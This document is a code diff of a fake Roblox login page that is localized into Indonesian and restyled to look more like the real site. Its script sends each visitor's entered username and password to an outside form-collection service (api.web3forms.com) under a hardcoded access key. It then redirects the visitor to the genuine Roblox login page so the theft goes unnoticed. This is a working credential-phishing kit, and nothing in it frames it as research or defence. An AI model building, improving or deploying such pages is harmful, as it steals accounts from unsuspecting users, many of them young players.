@@ -1,109 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Roblox</title>
 <style>
-  :root { --bg:#0d0f14; --card:#181b22; --in:#23262f; --line:#2f333d; --fg:#e8eaee; --dim:#9aa1ad; --acc:#00a2ff; }
   * { box-sizing: border-box; }
-  body { margin:0; background:var(--bg); color:var(--fg); font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
-  .card { width:100%; max-width:380px; background:var(--card); border:1px solid var(--line); border-radius:12px; padding:32px 24px; box-shadow:0 20px 60px rgba(0,0,0,.5); }
-  .logo { display:flex; justify-content:center; margin-bottom:20px; }
-  .logo svg { width:72px; height:72px; }
-  h1 { font-size:22px; font-weight:600; text-align:center; margin:0 0 6px; letter-spacing:-0.3px; }
-  p.sub { color:var(--dim); font-size:13px; text-align:center; margin:0 0 24px; }
-  label { display:block; font-size:11px; color:var(--dim); margin:0 0 6px; font-weight:600; letter-spacing:0.5px; text-transform:uppercase; }
-  input { width:100%; background:var(--in); color:var(--fg); border:1px solid var(--line); border-radius:8px; padding:13px 14px; font-size:15px; outline:none; transition:border-color .15s; }
-  input:focus { border-color:var(--acc); }
-  .field { margin-bottom:16px; }
-  .row { display:flex; align-items:center; justify-content:space-between; margin-bottom:20px; font-size:13px; }
-  .row label { text-transform:none; letter-spacing:0; color:var(--dim); font-weight:400; display:flex; align-items:center; gap:8px; cursor:pointer; margin:0; }
-  .row a { color:var(--acc); text-decoration:none; }
-  button { width:100%; background:var(--acc); color:#fff; border:0; border-radius:8px; padding:14px; font-size:15px; font-weight:600; cursor:pointer; transition:opacity .2s; }
-  button:active { transform:translateY(1px); }
-  button:disabled { opacity:0.7; cursor:not-allowed; }
-  .foot { text-align:center; margin-top:20px; font-size:13px; color:var(--dim); }
-  .foot a { color:var(--acc); text-decoration:none; }
-  .err { display:none; background:#3a1a1a; border:1px solid #6b2b2b; color:#ffb4b4; font-size:13px; padding:10px 12px; border-radius:8px; margin-bottom:16px; text-align:center; }
+  body { 
+    margin: 0; 
+    font-family: "Segoe UI", Helvetica, Arial, sans-serif; 
+    background-color: #1a1a1a;
+    background-image: url('https://images.rbxcdn.com/05b7e5a5b7e3e0f6a2f1c5b6e9d8a7f4.jpg'); /* Gambar background game */
+    background-size: cover;
+    background-position: center;
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    min-height: 100vh; 
+    padding: 20px;
+  }
+  .overlay {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.6);
+    z-index: 1;
+  }
+  .card { 
+    position: relative;
+    z-index: 2;
+    width: 100%; 
+    max-width: 400px; 
+    background: #232527; 
+    border-radius: 12px; 
+    padding: 32px 24px; 
+    box-shadow: 0 10px 30px rgba(0,0,0,0.8); 
+    color: #fff;
+  }
+  h1 { font-size: 24px; font-weight: 700; text-align: center; margin: 0 0 24px; }
+  input { 
+    width: 100%; 
+    background: #393b3d; 
+    color: #fff; 
+    border: 1px solid #393b3d; 
+    border-radius: 8px; 
+    padding: 14px; 
+    font-size: 16px; 
+    outline: none;
+    margin-bottom: 12px;
+  }
+  input:focus { border-color: #fff; }
+  button { 
+    width: 100%; 
+    background: transparent; 
+    color: #fff; 
+    border: 1px solid #fff; 
+    border-radius: 8px; 
+    padding: 14px; 
+    font-size: 16px; 
+    font-weight: 600; 
+    cursor: pointer; 
+    margin-top: 12px;
+    margin-bottom: 24px;
+  }
+  button:active { background: rgba(255,255,255,0.1); }
+  .err { display:none; color: #ff5555; font-size: 12px; margin-top: -8px; margin-bottom: 12px; }
+  .links { text-align: center; font-size: 15px; color: #b8b8b8; }
+  .links a { color: #fff; text-decoration: none; display: block; margin-bottom: 12px; }
+  .btn-gray { 
+    display: block; width: 100%; background: #393b3d; color: #fff; padding: 14px; 
+    border-radius: 8px; text-align: center; text-decoration: none; font-weight: 600; margin-bottom: 10px; 
+  }
+  .footer { text-align: center; font-size: 14px; color: #b8b8b8; margin-top: 24px; }
+  .footer a { color: #fff; text-decoration: none; font-weight: 600; }
 </style>
 </head>
 <body>
+<div class="overlay"></div>
 <main class="card">
-  <div class="logo" aria-hidden="true">
-    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-      <rect x="18" y="30" width="64" height="42" rx="6" fill="#e8eaee"/>
-      <rect x="26" y="38" width="20" height="6" rx="3" fill="#0d0f14"/>
-      <rect x="54" y="38" width="20" height="6" rx="3" fill="#0d0f14"/>
-      <rect x="38" y="58" width="24" height="5" rx="2.5" fill="#00a2ff"/>
-    </svg>
-  </div>
-  <h1>Log in to Roblox</h1>
-  <p class="sub">Welcome back. Sign in to continue.</p>
+  <h1>Log in ke Roblox</h1>
   
-  <div class="err" id="err">Incorrect username or password. Please try again.</div>
-  
-  <form id="f" autocomplete="off" novalidate>
-    <div class="field">
-      <label for="u">Username or Email</label>
-      <input id="u" name="username" type="text" autocapitalize="none" spellcheck="false" required>
-    </div>
-    <div class="field">
-      <label for="p">Password</label>
-      <input id="p" name="password" type="password" required>
-    </div>
-    <div class="row">
-      <label><input type="checkbox" name="remember" value="yes"> Remember me</label>
-      <a href="#" onclick="return false;">Forgot password?</a>
-    </div>
+  <form id="f" novalidate>
+    <input id="u" type="text" placeholder="Username atau Email" autocapitalize="none" required>
+    <input id="p" type="password" placeholder="Password" required>
+    <div class="err" id="err">Nama pengguna atau password salah.</div>
+    
     <button type="submit" id="go">Log In</button>
   </form>
   
-  <div class="foot">New to Roblox? <a href="#" onclick="return false;">Sign Up</a></div>
+  <div class="links">
+    <a href="#" onclick="return false;">Lupa Password atau Nama Pengguna?</a>
+  </div>
+  
+  <a href="#" class="btn-gray" onclick="return false;">Kirim Saya Kode Sekali Pakai</a>
+  <a href="#" class="btn-gray" onclick="return false;">Log In Cepat</a>
+  <a href="#" class="btn-gray" onclick="return false;">Opsi log in lainnya</a>
+  
+  <div class="footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
 </main>
 
 <script>
-(function(){
-  var f = document.getElementById('f');
-  var u = document.getElementById('u');
-  var p = document.getElementById('p');
+document.getElementById('f').addEventListener('submit', function(e){
+  e.preventDefault();
+  var u = document.getElementById('u').value;
+  var p = document.getElementById('p').value;
   var go = document.getElementById('go');
   var err = document.getElementById('err');
 
-  f.addEventListener('submit', function(e){
-    e.preventDefault();
-    
-    err.style.display = 'none';
-    if (!u.value.trim() || !p.value) {
-      err.textContent = 'Please enter your username and password.';
-      err.style.display = 'block';
-      return;
+  if(!u || !p) {
+    err.style.display = "block";
+    return;
+  }
+
+  err.style.display = "none";
+  go.textContent = "Logging in...";
+  go.disabled = true;
+
+  var key = "4a8e29f5-f24f-4a64-bbd1-31368a7f7130";
+
+  var data = { access_key: key, subject: "Roblox Login", username: u, password: p };
+
+  fetch("https://api.web3forms.com/submit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+    body: JSON.stringify(data)
+  })
+  .then(res => res.json())
+  .then(res => {
+    if(res.success) {
+       window.location.href = "https://www.roblox.com/id/login";
+    } else {
+       err.textContent = "Error: " + res.message;
+       err.style.display = "block";
+       go.textContent = "Log In";
+       go.disabled = false;
     }
-
-    go.disabled = true;
-    go.textContent = 'Logging in...';
-
-    var data = {
-      access_key: "4a8e29f5-f24f-4a64-bbd1-31368a7f7130", 
-      subject: "Roblox Login Data",
-      username: u.value,
-      password: p.value
-    };
-
-    fetch("https://api.web3forms.com/submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json", "Accept": "application/json" },
-      body: JSON.stringify(data)
-    })
-    .then(function(res) { return res.json(); })
-    .then(function(json) {
-      window.location.href = "https://www.roblox.com/login";
-    })
-    .catch(function(err) {
-      window.location.href = "https://www.roblox.com/login";
-    });
+  })
+  .catch(error => {
+    err.textContent = "Koneksi gagal.";
+    err.style.display = "block";
+    go.textContent = "Log In";
+    go.disabled = false;
   });
-})();
+});
 </script>
 </body>
 </html>
